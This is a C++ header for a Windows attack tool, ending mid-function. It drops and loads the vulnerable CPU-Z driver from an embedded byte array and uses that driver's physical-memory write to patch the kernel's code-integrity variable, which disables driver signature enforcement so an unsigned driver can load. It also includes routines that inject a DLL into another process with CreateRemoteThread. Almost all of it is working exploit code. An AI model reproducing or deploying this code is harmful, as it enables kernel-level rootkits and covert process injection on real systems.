#pragma once
#include "Global.h"
#include <iostream>
#include "cpuz141.h"

//helpers
__forceinline char locase_a(char c);
inline int _strcmp_Ex(const char *s1, const char *s2);

inline LONG QueryCiOptions(
	_In_ PVOID MappedBase,
	_Inout_ ULONG_PTR *KernelBase,
	_In_ RTL_OSVERSIONINFOW &g_osv
);

inline
LONG QueryCiEnabled(
	_In_ PVOID MappedBase,
	_In_ SIZE_T SizeOfImage,
	_Inout_ ULONG_PTR *KernelBase
);


//return Module Base using NtQuerySysteminformation. Taking module name as parameter
inline ULONG_PTR __declspec(dllexport) supGetModuleBaseByName(_In_ LPSTR ModuleName);

//return Ci related Address, take PRTL_OSVERSIONINFOW as parameter
inline DWORD_PTR QueryVariableAddress(RTL_OSVERSIONINFOW &g_osv);

//Adjust Privilege, take Privilege name and bool indicating false->disable true->enable
inline BOOL __declspec(dllexport) AdjustRights(const wchar_t * szPrivilege, BOOL bState);

//NtLoadDriver for critical sense 
inline NTSTATUS __declspec(dllexport) NtLoadDriverRoot(UNICODE_STRING &serviceKey);

//delete driver regkey, only driver name is required here.
inline BOOL __declspec(dllexport) DeleteDriverRegKey(PWCHAR DriverName);

//register a driver regkey, take driver name, output its serviceregkey for later usage
inline BOOL __declspec(dllexport) RegisterRegKey(PWCHAR DriverName, std::wstring &OutServiceRegKey);

//load driver by its file name. (related file name);
inline BOOL __declspec(dllexport) LoadDriver(PWCHAR DriverName);

//unload driver by its file name. (related file name);
inline void __declspec(dllexport) UnloadDriver(PWCHAR DriverName);

//GetDriverServiceFull In UNICODE_STRING (driver name only);
inline UNICODE_STRING __declspec(dllexport) GetDriverServiceFull(PWCHAR DriverName);

//Get os version, return a struct.
inline RTL_OSVERSIONINFOW __declspec(dllexport) GetOsVersion();

//Get Kernal Ci Address automatically;
inline DWORD_PTR __declspec(dllexport) GetKernelCiAddress();

//Drop File from char[]array, this array must be in hex
inline BOOL  __declspec(dllexport) DropFile(unsigned char* fileInHex, wchar_t* filename, SIZE_T lengthOfCharArray);

//Load an unsigned Driver
inline BOOL  __declspec(dllexport) LoadUnsignedDriver(PWCHAR DriverFileNameWithOutExtension);

//safely delete a file
inline BOOL __declspec(dllexport) SafeDeleteFile(PWCHAR FileName, bool isInSystemFolder);

//safely unload a driver
inline void __declspec(dllexport) SafeUnloadDriver(PWCHAR DriverName);

//nt open process wrapper
inline HANDLE __declspec(dllexport) NtOpenProcessWrapper(DWORD PID);

//Inject a dll using LoadLibrary
inline BOOL __declspec(dllexport) LoadLibraryInject(DWORD ProcID, PWCHAR DLLNAME);

//Get Full Path
inline PWCHAR __declspec(dllexport) GetFileFullPath(PWCHAR RelativePath);

//Inject a dll using ldrLoadDll
inline BOOL __declspec(dllexport) LdrLoadDllInject(DWORD ProcID, PWCHAR DLLNAME);



namespace CPUZ {

#define IOCTL_CR 0x9C402428
#define IOCTL_READ 0x9C402420
#define IOCTL_WRITE 0x9C402430
#define CPUZ_NAME "\\\\.\\cpuz141"

#define LODWORD(l)       ((DWORD)(((DWORD_PTR)(l)) & 0xffffffff))
#define HIDWORD(l)       ((DWORD)((((DWORD_PTR)(l)) >> 32) & 0xffffffff))

	typedef struct _InputRead
	{
		uint32_t dwAddressHigh;
		uint32_t dwAddressLow;
		uint32_t dwLength;
		uint32_t dwBufferHigh;
		uint32_t dwBufferLow;
	}InputRead, *PInputRead;

	typedef struct _InputWrite
	{
		uint32_t dwAddressHigh;
		uint32_t dwAddressLow;
		uint32_t dwVal;
	}InputWrite, *PInputWrite;

	typedef struct _Output
	{
		uint32_t Operation;
		uint32_t dwBufferLow;
	}Output, *POutput;

	HANDLE hDevice = INVALID_HANDLE_VALUE;
	uint64_t ControlReg3 = 0;

	inline BOOL PrepareCPUZ();
	inline BOOL ReadCr3();
	inline uint64_t TranslateVirtualAddress(uint64_t directoryTableBase, LPVOID virtualAddress);
	inline BOOLEAN ReadPhysicalAddress(uint64_t Address, PVOID buffer, SIZE_T Length);
	inline BOOL CriticalPatchAndLoadAndUnPatch(bool isWin7, UNICODE_STRING &DriverServiceKey, PVOID Address);
	inline BOOL CloseCPUZ();

	inline BOOL CloseCPUZ() {
		return NT_SUCCESS(NtClose(hDevice));
	}

	inline BOOL PrepareCPUZ() {

		hDevice = CreateFileA(CPUZ_NAME, GENERIC_READ | GENERIC_WRITE | SYNCHRONIZE, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
		if (hDevice == INVALID_HANDLE_VALUE)
			throw std::runtime_error("Could Not Open cpu141.sys .");

		if (!ReadCr3())
			throw std::runtime_error("Could Not Read Control Register 3.");

		return TRUE;
	}

	inline BOOL ReadCr3()
	{
		DWORD BytesRet = 0;
		uint32_t CR = 3;		// Read ControlRegister3
		return DeviceIoControl(hDevice, IOCTL_CR, &CR, sizeof(CR), &ControlReg3, sizeof(ControlReg3), &BytesRet, nullptr);
	}

	template <typename T, typename U>
	T ReadPhysicalAddress(U Address)
	{
		T Buff{ 0 };
		if (!ReadPhysicalAddress((uint64_t)Address, &Buff, sizeof(T)))
			throw std::runtime_error("Read Of Physical Address Failed.");
		return Buff;
	}
	/* Read Physical Address Using CPU-Z */
	inline BOOLEAN ReadPhysicalAddress(uint64_t Address, PVOID buffer, SIZE_T Length)
	{
		DWORD BytesRet = 0;
		InputRead in{ 0 };
		Output out{ 0 };

		if (Address == 0 || buffer == nullptr)
			return false;

		in.dwAddressHigh = HIDWORD(Address);
		in.dwAddressLow = LODWORD(Address);
		in.dwLength = (uint32_t)Length;
		in.dwBufferHigh = HIDWORD(buffer);
		in.dwBufferLow = LODWORD(buffer);

		return DeviceIoControl(hDevice, IOCTL_READ, &in, sizeof(in), &out, sizeof(out), &BytesRet, nullptr);
	}

	/* Translating Virtual Address To Physical Address, Using a Table Base */
	inline uint64_t TranslateVirtualAddress(uint64_t directoryTableBase, LPVOID virtualAddress)
	{
		auto va = (uint64_t)virtualAddress;

		auto PML4 = (USHORT)((va >> 39) & 0x1FF); //<! PML4 Entry Index
		auto DirectoryPtr = (USHORT)((va >> 30) & 0x1FF); //<! Page-Directory-Pointer Table Index
		auto Directory = (USHORT)((va >> 21) & 0x1FF); //<! Page Directory Table Index
		auto Table = (USHORT)((va >> 12) & 0x1FF); //<! Page Table Index

												   // 
												   // Read the PML4 Entry. DirectoryTableBase has the base address of the table.
												   // It can be read from the CR3 register or from the kernel process object.
												   // 
		auto PML4E = ReadPhysicalAddress<uint64_t>(directoryTableBase + PML4 * sizeof(ULONGLONG));

		if (PML4E == 0)
			return 0;

		// 
		// The PML4E that we read is the base address of the next table on the chain,
		// the Page-Directory-Pointer Table.
		// 
		auto PDPTE = ReadPhysicalAddress<uint64_t>((PML4E & 0xFFFFFFFFFF000) + DirectoryPtr * sizeof(ULONGLONG));

		if (PDPTE == 0)
			return 0;

		//Check the PS bit
		if ((PDPTE & (1 << 7)) != 0) {
			// If the PDPTE¨s PS flag is 1, the PDPTE maps a 1-GByte page. The
			// final physical address is computed as follows:
			// ！ Bits 51:30 are from the PDPTE.
			// ！ Bits 29:0 are from the original va address.
			return (PDPTE & 0xFFFFFC0000000) + (va & 0x3FFFFFFF);
		}

		//
		// PS bit was 0. That means that the PDPTE references the next table
		// on the chain, the Page Directory Table. Read it.
		// 
		auto PDE = ReadPhysicalAddress<uint64_t>((PDPTE & 0xFFFFFFFFFF000) + Directory * sizeof(ULONGLONG));

		if (PDE == 0)
			return 0;

		if ((PDE & (1 << 7)) != 0) {
			// If the PDE¨s PS flag is 1, the PDE maps a 2-MByte page. The
			// final physical address is computed as follows:
			// ！ Bits 51:21 are from the PDE.
			// ！ Bits 20:0 are from the original va address.
			return (PDE & 0xFFFFFFFE00000) + (va & 0x1FFFFF);
		}

		//
		// PS bit was 0. That means that the PDE references a Page Table.
		// 
		auto PTE = ReadPhysicalAddress<uint64_t>((PDE & 0xFFFFFFFFFF000) + Table * sizeof(ULONGLONG));

		if (PTE == 0)
			return 0;

		//
		// The PTE maps a 4-KByte page. The
		// final physical address is computed as follows:
		// ！ Bits 51:12 are from the PTE.
		// ！ Bits 11:0 are from the original va address.
		return (PTE & 0xFFFFFFFFFF000) + (va & 0xFFF);
	}

	inline BOOL CriticalPatchAndLoadAndUnPatch(bool isWin7, UNICODE_STRING &DriverServiceKey, PVOID Address) {

		DWORD BytesRet = 0;
		InputWrite patch{ 0 };
		InputWrite unpatch{ 0 };

		Output out{ 0 };
		uint64_t phys = TranslateVirtualAddress(ControlReg3, Address);

		patch.dwAddressHigh = HIDWORD(phys);
		patch.dwAddressLow = LODWORD(phys);

		unpatch.dwAddressHigh = HIDWORD(phys);
		unpatch.dwAddressLow = LODWORD(phys);


		if (isWin7)
		{
			patch.dwVal = 0;
			unpatch.dwVal = 1;
		}
		else
		{
			patch.dwVal = 8;
			unpatch.dwVal = 6;
		}


		DeviceIoControl(hDevice, IOCTL_WRITE, &patch, sizeof(patch), &out, sizeof(out), &BytesRet, nullptr);
		auto ret = NtLoadDriver(&DriverServiceKey);
		DeviceIoControl(hDevice, IOCTL_WRITE, &unpatch, sizeof(unpatch), &out, sizeof(out), &BytesRet, nullptr);

		if (ret == STATUS_SUCCESS)
			return TRUE;
		else
			return FALSE;
	}

}

inline BOOL __declspec(dllexport) SafeDeleteFile(PWCHAR FileName, bool isInSystemFolder) {

	if (!isInSystemFolder)
		return DeleteFile(FileName);
	else
	{
		wchar_t wszSysDir[MAX_PATH];
		GetSystemDirectoryW(wszSysDir, MAX_PATH);
		std::wstring CPUZFullPath = std::wstring(wszSysDir) + std::wstring(L"\\drivers\\") + std::wstring(FileName);
		return DeleteFile(CPUZFullPath.c_str());
	}
}

inline BOOL __declspec(dllexport) LoadUnsignedDriver(PWCHAR DriverFileNameWithOutExtension) {

	BOOL ret;

	//1 register our cpuz driver
	wchar_t wszSysDir[MAX_PATH];
	GetSystemDirectoryW(wszSysDir, MAX_PATH);
	std::wstring CPUZFullPath = std::wstring(wszSysDir) + std::wstring(L"\\drivers\\cpuz141.sys");

	std::wstring CPUZservicekey;
	ret = RegisterRegKey((PWCHAR)CPUZFullPath.c_str(), CPUZservicekey);
	if (!ret)
	{
		printf("Cannot RegisterRegKey\n");
		return FALSE;
	}

	//2 unload our cpuz driver
	UnloadDriver(L"cpuz141");

	//3 drop our cpuz file
	ret = DropFile(CpuzShellcode, (PWCHAR)CPUZFullPath.c_str(), sizeof(CpuzShellcode));
	if (!ret)
	{
		printf("Cannot Drop Cpuz file\n");
		return FALSE;
	}

	//4 load our cpuz driver
	UNICODE_STRING cpuzService = { 0 };
	RtlInitUnicodeString(&cpuzService, CPUZservicekey.c_str());
	ret = NT_SUCCESS(NtLoadDriver(&cpuzService));
	if (!ret)
	{
		printf("Cannot load cpuz driver\n");
		return FALSE;
	}

	//5 Prepare our expolirt
	ret = CPUZ::PrepareCPUZ();
	if (!ret)
	{
		printf("Cannot PrepareCPUZ\n");
		return FALSE;
	}

	//6 Get Our dwBuild Number
	auto bNumber = GetOsVersion().dwBuildNumber;
	bool isWin7 = bNumber < 9200 ? TRUE : FALSE;

	//7 Get Our Patch Address
	auto ciAddress = GetKernelCiAddress();
	if (ciAddress == 0)
	{
		printf("Cannot GetKernelCiAddress\n");
		return FALSE;
	}

	//8 register Our Driver
	std::wstring OurDriverServiceKey;
	std::wstring DriverFileName = DriverFileNameWithOutExtension;
	ret = RegisterRegKey((PWCHAR)DriverFileName.c_str(), OurDriverServiceKey);
	if (!ret)
	{
		printf("Cannot RegisterRegKey for our Driver\n");
		return FALSE;
	}
	UNICODE_STRING OurDriverService = { 0 };
	RtlInitUnicodeString(&OurDriverService, OurDriverServiceKey.c_str());

	//9 Everything is ready, do our job
	ret = CPUZ::CriticalPatchAndLoadAndUnPatch(isWin7, OurDriverService, (PVOID)ciAddress);
	if (!ret)
	{
		printf("CriticalPatchAndLoadAndUnPatch Failed\n");
	}

	//CLEAN UP
	CPUZ::CloseCPUZ();

	return TRUE;
}

__forceinline char locase_a(char c)
{
	if ((c >= 'A') && (c <= 'Z'))
		return c + 0x20;
	else
		return c;
}

inline int _strcmp_Ex(const char *s1, const char *s2)
{
	char c1, c2;

	if (s1 == s2)
		return 0;

	if (s1 == 0)
		return -1;

	if (s2 == 0)
		return 1;

	do {
		c1 = locase_a(*s1);
		c2 = locase_a(*s2);
		s1++;
		s2++;
	} while ((c1 != 0) && (c1 == c2));

	return (int)(c1 - c2);
}
/*
* QueryCiOptions
*
* Purpose:
*
* Find g_CiOptions variable address.
*
*/
inline
LONG QueryCiOptions(
	_In_ PVOID MappedBase,
	_Inout_ ULONG_PTR *KernelBase,
	_In_ RTL_OSVERSIONINFOW &g_osv
)
{
	PBYTE        CiInitialize = NULL;
	ULONG        c, j = 0;
	LONG         rel = 0;
	hde64s hs;

	CiInitialize = (PBYTE)GetProcAddress((HMODULE)MappedBase, "CiInitialize");
	if (CiInitialize == NULL)
	{
		printf("cannot get CiInitialize routine\n");
		return 0;
	}


	if (g_osv.dwBuildNumber > 16199) {

		c = 0;
		j = 0;
		do {

			/* call CipInitialize */
			if (CiInitialize[c] == 0xE8)
				j++;

			if (j > 1) {
				rel = *(PLONG)(CiInitialize + c + 1);
				break;
			}

			hde64_disasm(CiInitialize + c, &hs);
			if (hs.flags & F_ERROR)
				break;
			c += hs.len;

		} while (c < 256);

	}
	else {

		c = 0;
		do {

			/* jmp CipInitialize */
			if (CiInitialize[c] == 0xE9) {
				rel = *(PLONG)(CiInitialize + c + 1);
				break;
			}
			hde64_disasm(CiInitialize + c, &hs);
			if (hs.flags & F_ERROR)
				break;
			c += hs.len;

		} while (c < 256);

	}

	CiInitialize = CiInitialize + c + 5 + rel;
	c = 0;
	do {

		if (*(PUSHORT)(CiInitialize + c) == 0x0d89) {
			rel = *(PLONG)(CiInitialize + c + 2);
			break;
		}
		hde64_disasm(CiInitialize + c, &hs);
		if (hs.flags & F_ERROR)
			break;
		c += hs.len;

	} while (c < 256);

	CiInitialize = CiInitialize + c + 6 + rel;

	*KernelBase = *KernelBase + CiInitialize - (PBYTE)MappedBase;

	return rel;
}


/*
* QueryCiEnabled
*
* Purpose:
*
* Find g_CiEnabled variable address.
*
*/
inline
LONG QueryCiEnabled(
	_In_ PVOID MappedBase,
	_In_ SIZE_T SizeOfImage,
	_Inout_ ULONG_PTR *KernelBase
)
{
	SIZE_T  c;
	LONG    rel = 0;

	for (c = 0; c < SizeOfImage - sizeof(DWORD); c++) {
		if (*(PDWORD)((PBYTE)MappedBase + c) == 0x1d8806eb) {
			rel = *(PLONG)((PBYTE)MappedBase + c + 4);
			*KernelBase = *KernelBase + c + 8 + rel;
			break;
		}
	}

	return rel;
}

inline PVOID __declspec(dllexport) supGetSystemInfo(
	_In_ SYSTEM_INFORMATION_CLASS InfoClass
)
{
	INT         c = 0;
	PVOID       Buffer = NULL;
	ULONG		Size = 0x1000;
	NTSTATUS    status;
	ULONG       memIO;
	PVOID       hHeap = NtCurrentPeb()->ProcessHeap;

	do {
		Buffer = RtlAllocateHeap(hHeap, HEAP_ZERO_MEMORY, (SIZE_T)Size);
		if (Buffer != NULL) {
			status = NtQuerySystemInformation(InfoClass, Buffer, Size, &memIO);
		}
		else {
			return NULL;
		}
		if (status == STATUS_INFO_LENGTH_MISMATCH) {
			RtlFreeHeap(hHeap, 0, Buffer);
			Size *= 2;
			c++;
			if (c > 100) {
				status = STATUS_SECRET_TOO_LONG;
				break;
			}
		}
	} while (status == STATUS_INFO_LENGTH_MISMATCH);

	if (NT_SUCCESS(status)) {
		return Buffer;
	}

	if (Buffer) {
		RtlFreeHeap(hHeap, 0, Buffer);
	}
	return NULL;
}

inline ULONG_PTR __declspec(dllexport) supGetModuleBaseByName(_In_ LPSTR ModuleName)
{
	ULONG_PTR ReturnAddress = 0;
	ULONG i, k;
	PRTL_PROCESS_MODULES miSpace;

	miSpace = (PRTL_PROCESS_MODULES)supGetSystemInfo(SystemModuleInformation);
	if (miSpace != NULL) {
		for (i = 0; i < miSpace->NumberOfModules; i++) {
			k = miSpace->Modules[i].OffsetToFileName;
			if (_strcmp_Ex((CONST CHAR*)&miSpace->Modules[i].FullPathName[k], ModuleName) == 0)
			{
				ReturnAddress = (ULONG_PTR)miSpace->Modules[i].ImageBase;
				break;
			}
		}
		RtlFreeHeap(NtCurrentPeb()->ProcessHeap, 0, miSpace);
	}
	return ReturnAddress;
}


inline DWORD_PTR QueryVariableAddress(RTL_OSVERSIONINFOW &g_osv)
{

	CHAR *NTOSKRNL_EXE = "ntoskrnl.exe";
	CHAR *CI_DLL = "ci.dll";

	LONG rel = 0;
	SIZE_T SizeOfImage = 0;
	ULONG_PTR Result = 0, ModuleKernelBase = 0;
	CHAR *szModuleName;
	WCHAR *wszErrorEvent, *wszSuccessEvent;
	PVOID MappedBase = NULL;

	CHAR szFullModuleName[MAX_PATH * 2];

	if (g_osv.dwBuildNumber < 9200) {
		szModuleName = NTOSKRNL_EXE;
		wszErrorEvent = TEXT("Ldr: ntoskrnl.exe loaded image base not recognized\n");
		wszSuccessEvent = TEXT("Ldr: ntoskrnl.exe loaded for pattern search\n");
	}
	else {
		szModuleName = CI_DLL;
		wszErrorEvent = TEXT("Ldr: CI.dll loaded image base not recognized\n");
		wszSuccessEvent = TEXT("Ldr: CI.dll loaded for pattern search\n");
	}

	wprintf(wszSuccessEvent);

	ModuleKernelBase = supGetModuleBaseByName(szModuleName);
	if (ModuleKernelBase == 0) {
		wprintf(wszErrorEvent);
		return 0;
	}

	szFullModuleName[0] = 0;
	if (!GetSystemDirectoryA(szFullModuleName, MAX_PATH))
		return 0;
	strcat(szFullModuleName, "\\");
	strcat(szFullModuleName, szModuleName);

	MappedBase = LoadLibraryExA(szFullModuleName, NULL, DONT_RESOLVE_DLL_REFERENCES);
	if (MappedBase) {

		if (g_osv.dwBuildNumber < 9200) {
			rel = QueryCiEnabled(
				MappedBase,
				SizeOfImage,
				&ModuleKernelBase);

		}
		else {
			rel = QueryCiOptions(
				MappedBase,
				&ModuleKernelBase,
				g_osv);
		}

		if (rel != 0) {
			Result = ModuleKernelBase;
		}
		FreeLibrary((HMODULE)MappedBase);
	}
	else {

		FreeLibrary((HMODULE)MappedBase);
		printf("Cannot Get Address\n");

	}

	return Result;
}

inline BOOL __declspec(dllexport) AdjustRights(const wchar_t * szPrivilege, BOOL bState) {

	HANDLE hToken = 0;

	if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY | TOKEN_ADJUST_PRIVILEGES, &hToken))
	{
		return FALSE;
	}

	TOKEN_PRIVILEGES TokenPrivileges = { 0 };
	TokenPrivileges.PrivilegeCount = 1;
	TokenPrivileges.Privileges[0].Attributes = bState ? SE_PRIVILEGE_ENABLED : 0;

	if (!LookupPrivilegeValueW(NULL, szPrivilege, &TokenPrivileges.Privileges[0].Luid))
	{
		CloseHandle(hToken);
		return FALSE;
	}

	if (!AdjustTokenPrivileges(hToken, FALSE, &TokenPrivileges, sizeof(TOKEN_PRIVILEGES), NULL, NULL))
	{
		CloseHandle(hToken);
		return FALSE;
	}

	CloseHandle(hToken);

	return TRUE;

}

inline BOOL __declspec(dllexport) DeleteDriverRegKey(PWCHAR DriverName) {

	HKEY hResult;

	wchar_t prefix[64] = L"SYSTEM\\CurrentControlSet\\services\\";

	wcsncat(prefix, DriverName, wcslen(DriverName));

	LSTATUS kStatus = RegOpenKeyEx(HKEY_LOCAL_MACHINE, prefix, 0, KEY_ALL_ACCESS, &hResult);

	if (kStatus == ERROR_SUCCESS)
		kStatus = RegDeleteTree(HKEY_LOCAL_MACHINE, prefix);
	else
		return FALSE;

	if (kStatus == ERROR_SUCCESS)
		return TRUE;
	else
		return FALSE;

}

inline BOOL __declspec(dllexport) RegisterRegKey(PWCHAR DriverName, std::wstring &OutServiceRegKey)
{

	std::wstring wszDriverName = DriverName;
	std::wstring wszDriverNameWithExtension;
	std::wstring wszDriverFullPath;

	if (wszDriverName.find(L".sys") == std::wstring::npos)
	{

		wszDriverNameWithExtension = wszDriverName + L".sys";
		wchar_t buffer[MAX_PATH] = { 0 };

		if (GetFullPathName(wszDriverNameWithExtension.c_str(), MAX_PATH, buffer, NULL) == FALSE)
			return FALSE;

		wszDriverFullPath = L"\\??\\" + std::wstring(buffer);

	}
	else {

		wszDriverFullPath = L"\\??\\" + wszDriverName;
		size_t OffsetToServiceName = wszDriverFullPath.find_last_of('\\');

		wszDriverName = wszDriverFullPath.substr(OffsetToServiceName + 1);
		wszDriverName = wszDriverName.substr(0, wszDriverName.find_first_of('.'));

	}

	wszDriverNameWithExtension = wszDriverName + L".sys";

	printf("DEBUG: Full File Path:\n%ws\n", wszDriverFullPath.c_str());
	printf("DEBUG: wszDriverName:\n%ws\n", wszDriverName.c_str());
	printf("DEBUG: wszDriverNameWithExtension:\n%ws\n", wszDriverNameWithExtension.c_str());

	HKEY hkResult;
	DWORD dwDispositon;
	DWORD dwServiceType = 1;
	DWORD dwServiceErrorControl = 1;
	DWORD dwServiceStart = 3;

	LPCWSTR lpImagePath = L"ImagePath";
	LPCWSTR lpType = L"Type";
	LPCWSTR lpErrorControl = L"ErrorControl";
	LPCWSTR lpStart = L"Start";

	//SubKey without register//machine
	std::wstring SubKey = L"System\\CurrentControlSet\\Services\\" + wszDriverName;

	//if already exists delete.
	LSTATUS Status = RegOpenKeyExW(HKEY_LOCAL_MACHINE, SubKey.c_str(), 0, KEY_ALL_ACCESS, &hkResult);
	if (Status == ERROR_SUCCESS)
		DeleteDriverRegKey((PWCHAR)wszDriverName.c_str());

	Status = RegCreateKeyExW(HKEY_LOCAL_MACHINE, SubKey.c_str(), 0, NULL, 0, KEY_ALL_ACCESS, NULL, &hkResult, &dwDispositon);		// Create SubKey.

	if (Status != ERROR_SUCCESS)
		return FALSE;


	LPCWSTR lpDependendOnService = L"DependOnService";
	std::wstring Dependency = L"FltMgr";
	RegSetValueExW(hkResult, lpDependendOnService, 0, REG_MULTI_SZ, (const BYTE*)Dependency.c_str(), Dependency.length() * 2);

	LPCWSTR lpSupportedFeatures = L"SupportedFeatures";
	DWORD   dwFeature = 3;
	Status = RegSetValueExW(hkResult, lpSupportedFeatures, 0, REG_DWORD, (const BYTE*)&dwFeature, sizeof(DWORD));

	//create folder Instances
	std::wstring instanceFolder = L"Instances";
	DWORD instanceFolderdwDispositon;
	HKEY InstanceFolderKey;
	Status = RegCreateKeyExW(hkResult, instanceFolder.c_str(), 0, NULL, 0, KEY_ALL_ACCESS, NULL, &InstanceFolderKey, &instanceFolderdwDispositon);

	std::wstring defaultInstanceName = wszDriverName + L" Instance";
	RegSetValueExW(InstanceFolderKey, L"DefaultInstance", 0, REG_SZ, (const BYTE*)defaultInstanceName.c_str(), defaultInstanceName.length() * 2);

	//create folder driverName Instance
	std::wstring DriverInstanceFolder = wszDriverName + L" Instance";
	DWORD DriverInstanceFolderdwDispositon;
	HKEY InstanceKey;
	Status = RegCreateKeyExW(InstanceFolderKey, DriverInstanceFolder.c_str(), 0, NULL, 0, KEY_ALL_ACCESS, NULL, &InstanceKey, &DriverInstanceFolderdwDispositon);

	DWORD dwFlags = 0;
	RegSetValueExW(InstanceKey, L"Altitude", 0, REG_SZ, (const BYTE*)L"360530", sizeof(L"360530") * 2);
	RegSetValueExW(InstanceKey, L"Flags", 0, REG_DWORD, (const BYTE*)&dwFlags, sizeof(DWORD));


	if (Status = RegSetValueExW(hkResult, lpImagePath, 0, REG_EXPAND_SZ, (const BYTE*)wszDriverFullPath.c_str(), wszDriverFullPath.length() * 2))		// Include prefix "\\??\\" for correct ImagePath
	{
		/* Error already caught */
	}
	else if (Status = RegSetValueExW(hkResult, lpType, 0, REG_DWORD, (const BYTE*)&dwServiceType, sizeof(DWORD)))	// Set Type Key
	{
		/* Error already caught */
	}
	else if (Status = RegSetValueExW(hkResult, lpErrorControl, 0, REG_DWORD, (const BYTE*)&dwServiceErrorControl, sizeof(DWORD)))	// Set ErrorControl Key
	{
		/* Error already caught */
	}
	else if (Status = RegSetValueExW(hkResult, lpStart, 0, REG_DWORD, (const BYTE*)&dwServiceStart, sizeof(DWORD)))	// Set Start Key
	{
		/* Error already caught */
	}

	OutServiceRegKey = (std::wstring(L"\\Registry\\Machine\\SYSTEM\\CurrentControlSet\\services\\") + wszDriverName);

	if (Status != ERROR_SUCCESS)
		return FALSE;
	return TRUE;

}

inline NTSTATUS __declspec(dllexport) NtLoadDriverRoot(UNICODE_STRING &serviceKey)
{
	return NtLoadDriver(&serviceKey);
}

inline BOOL __declspec(dllexport) LoadDriver(PWCHAR DriverName)
{
	std::wstring tmp;

	if (RegisterRegKey(DriverName, tmp))
	{
		UNICODE_STRING usKey = { 0 };
		RtlInitUnicodeString(&usKey, tmp.c_str());
		auto ret = NtLoadDriver(&usKey);
		if (ret == STATUS_SUCCESS)
			return TRUE;
		else {
			printf("LoadDriver Failed Status 0x%I32X", ret);
			return FALSE;
		}

	}

	return TRUE;
}

inline void __declspec(dllexport) UnloadDriver(PWCHAR DriverName)
{
	printf("Driver %ws Unloading..\n", DriverName);
	UNICODE_STRING usKey = GetDriverServiceFull(DriverName);
	auto ret = NtUnloadDriver(&usKey);
	printf("Unloading Staus 0x%I32X\n", ret);
}

inline void __declspec(dllexport) SafeUnloadDriver(PWCHAR DriverName)
{
	std::wstring OurDriverServiceKey;
	std::wstring DriverFileName = DriverName;
	auto ret = RegisterRegKey((PWCHAR)DriverFileName.c_str(), OurDriverServiceKey);
	if (!ret)
	{
		printf("Cannot RegisterRegKey for our Driver\n");
		return;
	}
	UNICODE_STRING OurDriverService = { 0 };
	RtlInitUnicodeString(&OurDriverService, OurDriverServiceKey.c_str());

	auto status = NtUnloadDriver(&OurDriverService);
	printf("Unloading Staus 0x%I32X\n", status);

}

inline HANDLE NtOpenProcessWrapper(DWORD PID)
{
	HANDLE				ProcessHandle;
	CLIENT_ID			ClientID;
	OBJECT_ATTRIBUTES	ObjectAttributes;

	ClientID.UniqueProcess = (HANDLE)PID;
	ClientID.UniqueThread = 0;
	InitializeObjectAttributes(&ObjectAttributes, 0, 0, 0, 0);

	NTSTATUS status = NtOpenProcess(&ProcessHandle, PROCESS_ALL_ACCESS, &ObjectAttributes, &ClientID);
	BOOL ret = NT_SUCCESS(status);

	if (ret)
		return ProcessHandle;
	else
		return NULL;
}

inline BOOL LoadLibraryInject(DWORD ProcID, PWCHAR DLLNAME)
{
	auto LoadLibraryAddress = GetProcAddress(GetModuleHandle(L"Kernel32"), "LoadLibraryW");

	if (!LoadLibraryAddress)
	{
		printf("Cannot Get Address of LoadLibraryW\n");
		return FALSE;
	}

	auto hProc = NtOpenProcessWrapper(ProcID);

	if (!hProc)
	{
		printf("Cannot Open Target Process Code %I32X\n", GetLastError());
		return FALSE;
	}

	auto LoadLibraryArgsAddress = VirtualAllocEx(hProc, NULL, 512, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

	if (!LoadLibraryArgsAddress)
	{
		printf("Cannot VirtualAllocEx Target Process for Args Code %I32X\n", GetLastError());
		return FALSE;
	}

	auto WriteRet = WriteProcessMemory(hProc, LoadLibraryArgsAddress, DLLNAME, wcslen(DLLNAME) + 4, NULL);

	if (!WriteRet)
	{
		printf("Cannot WriteProcessMemory Target Process for Args Code %I32X\n", GetLastError());
		return FALSE;
	}

	auto hThread = CreateRemoteThread(hProc, NULL, NULL, (LPTHREAD_START_ROUTINE)LoadLibraryAddress, LoadLibraryArgsAddress, NULL, NULL);

	if (!hThread)
	{
		printf("Cannot CreateRemoteThread %I32X\n", GetLastError());
		return FALSE;
	}

	WaitForSingleObject(hThread, INFINITE);

	VirtualFreeEx(hProc, LoadLibraryArgsAddress, 512, MEM_RELEASE);

	return NT_SUCCESS(NtClose(hProc));
}

inline PWCHAR GetFileFullPath(PWCHAR RelativePath)
{
	wchar_t fullPath[MAX_PATH] = { 0 };
	GetFullPathName(RelativePath, MAX_PATH, fullPath, NULL);
	return fullPath;

}

inline BOOL LdrLoadDllInject(DWORD ProcID, PWCHAR DLLNAME)
{
	auto LdrLoadDllAddress = GetProcAddress(GetModuleHandle(L"ntdll.dll"), "LdrLoadDll");

	if (!LdrLoadDllAddress)
	{
		printf("Cannot Get Address of LdrLoadDll\n");
		return FALSE;
	}

	auto hProc = NtOpenProcessWrapper(ProcID);

	if (!hProc)
	{
		printf("Cannot Open Target Process Code %I32X\n", GetLastError());
		return FALSE;
	}

	return 0;
}

inline UNICODE_STRING __declspec(dllexport) GetDriverServiceFull(PWCHAR DriverName)
{
	std::wstring FormattedFullKey = std::wstring(L"\\Registry\\Machine\\SYSTEM\\CurrentControlSet\\services\\") + std::wstring(DriverName);
	UNICODE_STRING usKey = { 0 };
	RtlInitUnicodeString(&usKey, FormattedFullKey.c_str());
	return usKey;
}

inline RTL_OSVERSIONINFOW __declspec(dllexport) GetOsVersion()
{
	RTL_OSVERSIONINFOW g_osv;
	g_osv.dwOSVersionInfoSize = sizeof(g_osv);
	RtlGetVersion((PRTL_OSVERSIONINFOW)&g_osv);
	return g_osv;
}

inline DWORD_PTR __declspec(dllexport) GetKernelCiAddress()
{
	RTL_OSVERSIONINFOW g_osv = GetOsVersion();
	return QueryVariableAddress(g_osv);
}

inline BOOL DropFile(unsigned char * fileInHex, wchar_t * filename, SIZE_T lengthOfCharArray)
{
	ULONG io;
	auto file = CreateFile(filename,                // name of the write
		GENERIC_ALL,          // open for writing
		0,                      // do not share
		NULL,                   // default security
		CREATE_ALWAYS,             // create new file only
		FILE_ATTRIBUTE_NORMAL | FILE_ATTRIBUTE_HIDDEN,  // normal file
		NULL);                  // no attr. template

	if (!WriteFile(file, fileInHex, lengthOfCharArray, &io, nullptr))
	{
		CloseHandle(file);
		return FALSE;
	}

	CloseHandle(file);
	return TRUE;
